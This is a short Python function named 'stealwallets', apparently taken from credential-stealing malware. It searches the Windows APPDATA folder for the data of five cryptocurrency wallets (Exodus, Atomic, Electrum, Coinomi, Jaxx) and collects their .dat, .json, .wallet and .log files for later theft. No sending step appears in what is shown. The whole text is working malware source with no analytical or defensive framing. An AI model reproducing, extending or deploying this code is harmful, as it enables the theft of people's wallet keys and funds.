def stealwallets():
    wallets = []
    
    wallet_paths = {
        'Exodus': os.path.join(os.environ['APPDATA'], 'Exodus'),
        'Atomic': os.path.join(os.environ['APPDATA'], 'atomic'),
        'Electrum': os.path.join(os.environ['APPDATA'], 'Electrum', 'wallets'),
        'Coinomi': os.path.join(os.environ['APPDATA'], 'Coinomi', 'Coinomi', 'wallets'),
        'Jaxx': os.path.join(os.environ['APPDATA'], 'Jaxx', 'Local Storage')
    }
    
    for wallet_name, wallet_path in wallet_paths.items():
        if os.path.exists(wallet_path):
            try:
                wallet_files = []
                for root, dirs, files in os.walk(wallet_path):
                    for file in files:
                        if any(ext in file.lower() for ext in ['.dat', '.json', '.wallet', '.log']):
                            src = os.path.join(root, file)
                            wallet_files.append(src)
                
                if wallet_files:
                    wallets.append({
                        'name': wallet_name,
                        'path': wallet_path,
                        'files': wallet_files,
                        'count': len(wallet_files)
                    })
            except:
                continue
    
    return wallets
